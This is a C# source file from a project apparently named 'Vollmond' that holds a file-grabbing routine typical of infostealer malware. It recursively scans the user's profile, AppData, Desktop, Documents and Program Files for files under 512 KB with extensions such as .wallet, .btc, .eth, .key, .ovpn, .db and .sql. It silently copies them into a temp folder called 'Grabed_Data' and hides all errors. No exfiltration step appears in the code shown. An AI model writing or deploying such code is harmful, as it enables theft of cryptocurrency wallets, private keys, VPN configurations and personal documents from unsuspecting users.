namespace Vollmond
{
    internal class GrabPotentiallyImportantFiles
    {
        public static void grabPotentiallyImportantFiles()
        {
            try
            {
                Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Grabed_Data", "Potentially important files"));
                string[] extensions = new string[]
                {
                ".txt", ".pdf", ".ini",
                ".json", ".dat",
                ".wallet", ".aes", ".backup",
                ".btc", ".eth", ".csv",
                ".sig", ".doc", ".p7s",
                ".log", ".rtf", ".docx",
                ".docm", ".xlsx", ".xls",
                ".xlsm", ".odt", ".ods",
                ".odp", ".cfg", ".bak",
                ".cer", ".crt", ".key",
                ".conf", ".sql", ".db",
                ".dbf", ".mdb", ".accdb",
                ".old", ".xml", ".vpn",
                ".ovpn", ".torrent", ".hexlic"
                };

                string[] directories = new string[]
                {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                };

                foreach (string rootDir in directories)
                {
                    try
                    {
                        var files = Directory.EnumerateFiles(rootDir, "*.*", SearchOption.AllDirectories)
                            .Where(f => extensions.Any(ext => f.EndsWith(ext, StringComparison.OrdinalIgnoreCase))
                                && new FileInfo(f).Length < 512000);

                        foreach (string file in files)
                        {
                            Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Grabed_Data", "Potentially important files", Path.GetRelativePath(rootDir, Path.GetDirectoryName(file))));
                            string destPath = Path.Combine(Path.GetTempPath(), "Grabed_Data", "Potentially important files", Path.GetRelativePath(rootDir, file));
                            Directory.CreateDirectory(Path.GetDirectoryName(destPath));
                            File.Copy(file, destPath);

                        }
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            catch { }
        }
    }
}
